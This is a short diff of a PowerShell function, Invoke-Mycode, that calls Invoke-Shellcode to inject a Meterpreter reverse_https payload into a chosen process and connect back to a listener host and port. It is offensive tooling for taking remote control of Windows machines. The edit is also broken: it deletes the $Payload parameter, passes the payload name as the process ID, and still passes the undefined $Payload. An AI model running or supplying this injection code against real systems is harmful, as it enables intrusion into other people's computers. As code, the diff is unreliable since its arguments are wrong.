@@ -764,9 +764,6 @@ function Invoke-Mycode
         [ValidateNotNullOrEmpty()]
         [UInt32]
         $ProcessID,
-        [Parameter(Mandatory = $false)]
-        [string]
-        $Payload = 'windows/meterpreter/reverse_https',
         [Parameter(Mandatory = $true)]
         [string]
         $Lhost = '127.0.0.1',
@@ -776,5 +773,5 @@ function Invoke-Mycode
         $Lport = "443"
           )
     Write-Host "Run meterpreter" 
-    Invoke-Shellcode -ProcessId $ProcessID -Payload $Payload -Lhost $Lhost -Lport $Lport -Verbose -Force
+    Invoke-Shellcode -ProcessId windows/meterpreter/reverse_https -Payload $Payload -Lhost $Lhost -Lport $Lport -Verbose -Force
 }
